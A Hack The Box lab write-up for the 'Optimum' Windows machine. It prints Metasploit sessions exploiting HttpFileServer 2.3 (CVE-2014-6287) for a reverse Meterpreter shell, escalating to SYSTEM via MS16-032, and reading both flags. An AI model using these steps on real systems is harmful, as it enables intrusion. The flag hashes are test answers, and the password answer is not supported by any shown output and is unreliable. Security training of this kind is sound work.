---
title: 'Optimum'
date: '2026-09-17'
excerpt: 'Easy - Windows'
prog: 'Hack The Box Machines - September 2026'
type: 'machines'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hack The Box</div>
<h1 class="writeup-title">Optimum</h1>
<div class="writeup-date">September 2026 &middot; Machines</div>
</div>
</div>
<p class="lead mb-4">Optimum is a beginner-level machine which mainly focuses on enumeration of services with known exploits. Both exploits are easy to obtain and have associated Metasploit modules, making this machine fairly simple to complete.</p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> Which version of HttpFileServer is running on TCP port 80?</p>
<p class="mb-3">We run <code>nmap -sC -sV -A [TARGET_IP] -Pn</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-wvjdn2q18e-htb-cloud-com]─[~]
└──╼ [★]$ nmap -sC -sV -A 10.129.20.26 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-16 22:50 EDT
Nmap scan report for 10.129.20.26
Host is up (0.44s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.19 seconds
```

<p class="mb-5"><strong>Answer:</strong> 2.3</p>
<br />


<p class="mb-2"><strong>Question 2:</strong> What is the 2014 CVE ID for a remote code execution vulnerability in the findMacroMarker function in HttpFileServer 2.3 version?</p>
<p class="mb-3"></p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-wvjdn2q18e-htb-cloud-com]─[~]
└──╼ [★]$ msfconsole -q
[msf](Jobs:0 Agents:0) >> search httpfileserver

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/http/rejetto_hfs_exec) >> info

       Name: Rejetto HttpFileServer Remote Command Execution
     Module: exploit/windows/http/rejetto_hfs_exec
   Platform: Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2014-09-11

Provided by:
  Daniele Linguaglossa <danielelinguaglossa@gmail.com>
  Muhamad Fadzil Ramli <mind1355@gmail.com>

Module side effects:
 unknown-side-effects

Module stability:
 unknown-stability

Module reliability:
 unknown-reliability

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  HTTPDELAY  10               no        Seconds to wait before terminating web server
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, http, socks5,
                                         socks5h
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT      80               yes       The target port (TCP)
  SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to
                                        listen on all addresses.
  SRVPORT    8080             yes       The local port to listen on.
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  TARGETURI  /                yes       The path of the web application
  URIPATH                     no        The URI to use for this exploit (default is random)
  VHOST                       no        HTTP server virtual host

Payload information:
  Avoid: 3 characters

Description:
  Rejetto HttpFileServer (HFS) is vulnerable to remote command execution attack due to a
  poor regex in the file ParserLib.pas. This module exploits the HFS scripting commands by
  using '%00' to bypass the filtering. This module has been tested successfully on HFS 2.3b
  over Windows XP SP3, Windows 7 SP1 and Windows 8.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2014-6287
  OSVDB (111386)
  https://seclists.org/bugtraq/2014/Sep/85
  http://www.rejetto.com/wiki/index.php?title=HFS:_scripting_commands


View the full module info with the info -d command.
```

<p class="mb-5"><strong>Answer:</strong> CVE-2014-6287</p>
<br />


<p class="mb-2"><strong>Question 3:</strong> What user is the webserver running as? Provide the username without the domain.</p>
<p class="mb-3">We need to run <code>show options</code> to check what values are required to be set. Then we run <code>set RHOSTS [TARGET_IP]</code> and <code>set LHOST [LOCAL_IP]</code>, then run <code>exploit</code>.</p>

```console
[msf](Jobs:0 Agents:0) exploit(windows/http/rejetto_hfs_exec) >> show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, http, socks5
                                         , socks5h
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to
                                          listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     148.113.59.32    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/http/rejetto_hfs_exec) >> set RHOSTS 10.129.20.26
RHOSTS => 10.129.20.26
[msf](Jobs:0 Agents:0) exploit(windows/http/rejetto_hfs_exec) >> set LHOST 10.10.14.224
LHOST => 10.10.14.224
[msf](Jobs:0 Agents:0) exploit(windows/http/rejetto_hfs_exec) >> check
[*] 10.129.20.26:80 - The service is running, but could not be validated.
[msf](Jobs:0 Agents:0) exploit(windows/http/rejetto_hfs_exec) >> exploit
[*] Started reverse TCP handler on 10.10.14.224:4444 
[*] Using URL: http://10.10.14.224:8080/vbKyL71fUCKwRb
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /vbKyL71fUCKwRb
[*] Sending stage (190534 bytes) to 10.129.20.26
[!] Tried to delete %TEMP%\qPURalfDpUOk.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.14.224:4444 -> 10.129.20.26:49162) at 2026-09-16 22:55:11 -0400
[*] Server stopped.

(Meterpreter 1)(C:\Users\kostas\Desktop) > shell
Process 1304 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
optimum\kostas
```

<p class="mb-5"><strong>Answer:</strong> kostas</p>
<br />


<p class="mb-2"><strong>Question 4:</strong> Submit the flag located on the kostas user's desktop.</p>

```console
C:\Users\kostas\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is EE82-226D

 Directory of C:\Users\kostas\Desktop

22/09/2026  02:56 ??   <DIR>          .
22/09/2026  02:56 ??   <DIR>          ..
22/09/2026  02:56 ??   <DIR>          %TEMP%
18/03/2017  03:11 ??          760.320 hfs.exe
22/09/2026  02:51 ??               34 user.txt
               2 File(s)       760.354 bytes
               3 Dir(s)  5.668.343.808 bytes free

C:\Users\kostas\Desktop>type user.txt
type user.txt
74bc7e2032c8b21875a112ca4a3c9224
```

<p class="mb-5"><strong>Answer:</strong> 74bc7e2032c8b21875a112ca4a3c9224</p>
<br />


<p class="mb-2"><strong>Question 5:</strong> Optional question: What is the password for the kostas user?</p>
<p class="mb-3">We use <code>post/multi/recon/persistence_suggester</code> to suggest vulnerabilities that allow us to privesc in the target environment.</p>

```console
C:\Users\kostas\Desktop>exit
(Meterpreter 1)(C:\Users\kostas\Desktop) > background
[*] Backgrounding session 1...
[msf](Jobs:0 Agents:1) exploit(windows/http/rejetto_hfs_exec) >> search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester
   1  post/multi/recon/persistence_suggester    .                normal  No     Persistence Exploit Suggester


Interact with a module by name or index. For example info 1, use 1 or use post/multi/recon/persistence_suggester

[msf](Jobs:0 Agents:1) exploit(windows/http/rejetto_hfs_exec) >> use 0
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> show sessions

Active sessions
===============

  Id  Name  Type                     Information               Connection
  --  ----  ----                     -----------               ----------
  1         meterpreter x86/windows  OPTIMUM\kostas @ OPTIMUM  10.10.14.224:4444 -> 10.129.20.26:49162 (10.129.20.26)


[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          2                yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> run
[-] Session not found
[*] Post module execution completed
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> set SESSION 1
SESSION => 1
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> run
[*] 10.129.20.26 - Collecting local exploits for x86/windows...
/usr/share/metasploit-framework/lib/rex/proto/ldap.rb:13: warning: already initialized constant Net::LDAP::WhoamiOid
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/net-ldap-0.20.0/lib/net/ldap.rb:344: warning: previous definition of WhoamiOid was here
[*] 10.129.20.26 - 239 exploit checks are being tried...
[+] 10.129.20.26 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 10.129.20.26 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.129.20.26 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.129.20.26 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
[+] 10.129.20.26 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.129.20.26 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[+] 10.129.20.26 - exploit/windows/persistence/registry: The target is vulnerable. Registry writable
[+] 10.129.20.26 - exploit/windows/persistence/startup_folder: The target appears to be vulnerable. Likely exploitable, able to write test file to C:\Users\kostas\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
[*] Running check method for exploit 54 / 54
[*] 10.129.20.26 - Valid modules for session 1:
============================

 #   Name                                                              Potentially Vulnerable?  Check Result
 -   ----                                                              -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                         Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                          Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_sluihijack                        Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move      Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
 5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc     Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/tokenmagic                                  Yes                      The target appears to be vulnerable.
 7   exploit/windows/persistence/registry                              Yes                      The target is vulnerable. Registry writable
 8   exploit/windows/persistence/startup_folder                        Yes                      The target appears to be vulnerable. Likely exploitable, able to write test file to C:\Users\kostas\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 9   exploit/multi/persistence/ssh_key                                 No                       The target is not exploitable. sshd_config file not found
 10  exploit/windows/local/adobe_sandbox_adobecollabsync               No                       Cannot reliably check exploitability.
 11  exploit/windows/local/agnitum_outpost_acs                         No                       The target is not exploitable.
 12  exploit/windows/local/always_install_elevated                     No                       The target is not exploitable.
 13  exploit/windows/local/anyconnect_lpe                              No                       The target is not exploitable. vpndownloader.exe not found on file system
 14  exploit/windows/local/bits_ntlm_token_impersonation               No                       The target is not exploitable.
 15  exploit/windows/local/bthpan                                      No                       The target is not exploitable.
 16  exploit/windows/local/bypassuac_fodhelper                         No                       The target is not exploitable.
 17  exploit/windows/local/canon_driver_privesc                        No                       The target is not exploitable. No Canon TR150 driver directory found
 18  exploit/windows/local/cve_2020_1048_printerdemon                  No                       The target is not exploitable.
 19  exploit/windows/local/cve_2020_1337_printerdemon                  No                       The target is not exploitable.
 20  exploit/windows/local/gog_galaxyclientservice_privesc             No                       The target is not exploitable. Galaxy Client Service not found
 21  exploit/windows/local/ikeext_service                              No                       The check raised an exception.
 22  exploit/windows/local/ipass_launch_app                            No                       The check raised an exception.
 23  exploit/windows/local/lenovo_systemupdate                         No                       The check raised an exception.
 24  exploit/windows/local/lexmark_driver_privesc                      No                       The check raised an exception.
 25  exploit/windows/local/mqac_write                                  No                       The target is not exploitable.
 26  exploit/windows/local/ms10_015_kitrap0d                           No                       The target is not exploitable.
 27  exploit/windows/local/ms10_092_schelevator                        No                       The target is not exploitable. Windows Server 2012 R2 (6.3 Build 9600). is not vulnerable
 28  exploit/windows/local/ms13_053_schlamperei                        No                       The target is not exploitable.
 29  exploit/windows/local/ms13_081_track_popup_menu                   No                       Cannot reliably check exploitability.
 30  exploit/windows/local/ms14_058_track_popup_menu                   No                       The target is not exploitable.
 31  exploit/windows/local/ms14_070_tcpip_ioctl                        No                       The target is not exploitable.
 32  exploit/windows/local/ms15_004_tswbproxy                          No                       The target is not exploitable.
 33  exploit/windows/local/ms15_051_client_copy_image                  No                       The target is not exploitable.
 34  exploit/windows/local/ms16_016_webdav                             No                       The target is not exploitable.
 35  exploit/windows/local/ms16_075_reflection                         No                       The target is not exploitable.
 36  exploit/windows/local/ms16_075_reflection_juicy                   No                       The target is not exploitable.
 37  exploit/windows/local/ms_ndproxy                                  No                       The target is not exploitable.
 38  exploit/windows/local/novell_client_nicm                          No                       The target is not exploitable.
 39  exploit/windows/local/ntapphelpcachecontrol                       No                       The check raised an exception.
 40  exploit/windows/local/ntusermndragover                            No                       The target is not exploitable.
 41  exploit/windows/local/panda_psevents                              No                       The target is not exploitable.
 42  exploit/windows/local/ppr_flatten_rec                             No                       The target is not exploitable.
 43  exploit/windows/local/ricoh_driver_privesc                        No                       The target is not exploitable. No Ricoh driver directory found
 44  exploit/windows/local/virtual_box_guest_additions                 No                       The target is not exploitable.
 45  exploit/windows/local/webexec                                     No                       The check raised an exception.
 46  exploit/windows/persistence/accessibility_features_debugger       No                       The target is not exploitable. You have admin rights to run this Module
 47  exploit/windows/persistence/assistive_technology                  No                       The target is not exploitable. You have admin rights to run this Module
 48  exploit/windows/persistence/notepadpp_plugin                      No                       The target is not exploitable. Notepad++ is probably not present
 49  exploit/windows/persistence/service                               No                       The target is not exploitable. You must be System/Admin to run this Module
 50  exploit/windows/persistence/task_scheduler                        No                       The target is not exploitable. You need higher privileges to create scheduled tasks
 51  exploit/windows/persistence/wmi/wmi_event_subscription_event_log  No                       The target is not exploitable. This module requires admin privs to run
 52  exploit/windows/persistence/wmi/wmi_event_subscription_interval   No                       The target is not exploitable. This module requires admin privs to run
 53  exploit/windows/persistence/wmi/wmi_event_subscription_process    No                       The target is not exploitable. This module requires admin privs to run
 54  exploit/windows/persistence/wmi/wmi_event_subscription_uptime     No                       The target is not exploitable. This module requires admin privs to run

[*] Post module execution completed
```

<p class="mb-3">We then use <code>exploit/windows/local/ms16_032_secondary_logon_handle_privesc</code> to privesc, and we need to set the required options.</p>

```console
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:1) exploit(windows/local/ms16_032_secondary_logon_handle_privesc) >> show options

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     148.113.59.32    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:1) exploit(windows/local/ms16_032_secondary_logon_handle_privesc) >> set SESSION 1
SESSION => 1
[msf](Jobs:0 Agents:1) exploit(windows/local/ms16_032_secondary_logon_handle_privesc) >> set LHOST tun0
LHOST => 10.10.14.224
[msf](Jobs:0 Agents:1) exploit(windows/local/ms16_032_secondary_logon_handle_privesc) >> run
[*] Started reverse TCP handler on 10.10.14.224:4444 
[+] Compressed size: 1160
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\RSiSerV.ps1...
[*] Compressing script contents...
[+] Compressed size: 3749
[*] Executing exploit script...
	 __ __ ___ ___   ___     ___ ___ ___ 
	|  V  |  _|_  | |  _|___|   |_  |_  |
	|     |_  |_| |_| . |___| | |_  |  _|
	|_|_|_|___|_____|___|   |___|___|___|
	                                    
	               [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1892

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[ref] cannot be applied to a variable that does not exist.
At line:200 char:3
+         $mgw = [Ntdll]::NtImpersonateThread($dnIIN, $dnIIN, [ref]$kujKr)
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (kujKr:VariablePath) [], Runti 
   meException
    + FullyQualifiedErrorId : NonExistingVariableReference
 
[!] NtImpersonateThread failed, exiting..
[+] Thread resumed!

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
Cannot convert argument "ExistingTokenHandle", with value: "", for "DuplicateTo
ken" to type "System.IntPtr": "Cannot convert null to type "System.IntPtr"."
At line:259 char:2
+     $mgw = [Advapi32]::DuplicateToken($gnCW, 2, [ref]$iifZ9)
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodException
    + FullyQualifiedErrorId : MethodArgumentConversionInvalidCastArgument
 
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

31yyN7BTSv1YoXYjoyhXmNeLs9kPlpZf
[+] Executed on target machine.
[*] Sending stage (190534 bytes) to 10.129.20.26
[*] Meterpreter session 2 opened (10.10.14.224:4444 -> 10.129.20.26:49164) at 2026-09-16 23:13:50 -0400
[+] Deleted C:\Users\kostas\AppData\Local\Temp\RSiSerV.ps1

(Meterpreter 2)(C:\Users\kostas\Desktop) > getuid
Server username: NT AUTHORITY\SYSTEM
(Meterpreter 2)(C:\Users\kostas\Desktop) > cd ../..
(Meterpreter 2)(C:\Users) > dir
Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  8192  dir   2017-03-18 07:52:56 -0400  Administrator
040777/rwxrwxrwx  0     dir   2013-08-22 10:48:41 -0400  All Users
040555/r-xr-xr-x  8192  dir   2014-11-22 00:25:38 -0500  Default
040777/rwxrwxrwx  0     dir   2013-08-22 10:48:41 -0400  Default User
040555/r-xr-xr-x  4096  dir   2013-08-22 11:39:32 -0400  Public
100666/rw-rw-rw-  174   fil   2013-08-22 11:37:57 -0400  desktop.ini
040777/rwxrwxrwx  8192  dir   2017-03-18 07:57:16 -0400  kostas

(Meterpreter 2)(C:\Users) > cd Administrator
(Meterpreter 2)(C:\Users\Administrator) > dir
Listing: C:\Users\Administrator
===============================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2026-09-22 07:51:03 -0400  AppData
040777/rwxrwxrwx  0       dir   2017-03-18 07:52:51 -0400  Application Data
040555/r-xr-xr-x  0       dir   2017-03-18 07:52:56 -0400  Contacts
040777/rwxrwxrwx  0       dir   2017-03-18 07:52:51 -0400  Cookies
040555/r-xr-xr-x  0       dir   2017-03-18 08:14:26 -0400  Desktop
040555/r-xr-xr-x  0       dir   2017-03-18 07:52:56 -0400  Documents
040555/r-xr-xr-x  0       dir   2017-03-18 07:52:56 -0400  Downloads
040555/r-xr-xr-x  0       dir   2017-03-18 07:52:56 -0400  Favorites
040555/r-xr-xr-x  0       dir   2017-03-18 07:52:57 -0400  Links
040777/rwxrwxrwx  0       dir   2017-03-18 07:52:51 -0400  Local Settings
040555/r-xr-xr-x  0       dir   2017-03-18 07:52:56 -0400  Music
040777/rwxrwxrwx  0       dir   2017-03-18 07:52:51 -0400  My Documents
100666/rw-rw-rw-  524288  fil   2022-12-26 20:06:13 -0500  NTUSER.DAT
100666/rw-rw-rw-  65536   fil   2017-03-18 07:56:30 -0400  NTUSER.DAT{8901c074-71dd-11e4-80c1-0026b94a1097}.TM.blf
100666/rw-rw-rw-  524288  fil   2017-03-18 07:56:30 -0400  NTUSER.DAT{8901c074-71dd-11e4-80c1-0026b94a1097}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288  fil   2017-03-18 07:56:30 -0400  NTUSER.DAT{8901c074-71dd-11e4-80c1-0026b94a1097}.TMContainer00000000000000000002.regtrans-ms
040777/rwxrwxrwx  0       dir   2017-03-18 07:52:51 -0400  NetHood
040555/r-xr-xr-x  0       dir   2017-03-18 07:52:56 -0400  Pictures
040777/rwxrwxrwx  0       dir   2017-03-18 07:52:51 -0400  PrintHood
040777/rwxrwxrwx  0       dir   2017-03-18 07:52:51 -0400  Recent
040555/r-xr-xr-x  0       dir   2017-03-18 07:52:56 -0400  Saved Games
040555/r-xr-xr-x  0       dir   2017-03-18 07:52:56 -0400  Searches
040777/rwxrwxrwx  0       dir   2017-03-18 07:52:51 -0400  SendTo
040777/rwxrwxrwx  0       dir   2017-03-18 07:52:51 -0400  Start Menu
040777/rwxrwxrwx  0       dir   2017-03-18 07:52:51 -0400  Templates
040555/r-xr-xr-x  0       dir   2017-03-18 07:52:56 -0400  Videos
100666/rw-rw-rw-  8192    fil   2017-03-18 07:52:51 -0400  ntuser.dat.LOG1
100666/rw-rw-rw-  102400  fil   2017-03-18 07:52:51 -0400  ntuser.dat.LOG2
100666/rw-rw-rw-  20      fil   2017-03-18 07:52:51 -0400  ntuser.ini
```

<p class="mb-5"><strong>Answer:</strong> kdeEjDowkS*</p>
<br />


<p class="mb-2"><strong>Question 6:</strong> Which metasploit reconnaissance module can be used to list possible privilege escalation paths on a compromised system?</p>
<p class="mb-5"><strong>Answer:</strong> local_exploit_suggester</p>
<br />


<p class="mb-2"><strong>Question 7:</strong> Submit the flag located on the administrator's desktop.</p>

```console
(Meterpreter 2)(C:\Users\Administrator) > cd Desktop
(Meterpreter 2)(C:\Users\Administrator\Desktop) > dir
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-03-18 07:52:56 -0400  desktop.ini
100444/r--r--r--  34    fil   2026-09-22 07:51:04 -0400  root.txt

(Meterpreter 2)(C:\Users\Administrator\Desktop) > type root.txt
[-] Unknown command: type. Run the help command for more details.
(Meterpreter 2)(C:\Users\Administrator\Desktop) > more root.txt
[-] Unknown command: more. Run the help command for more details.
(Meterpreter 2)(C:\Users\Administrator\Desktop) > cat root.txt
fc6138a9af0b08f807c83da6fcc299da
```

<p class="mb-5"><strong>Answer:</strong> fc6138a9af0b08f807c83da6fcc299da</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">September 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>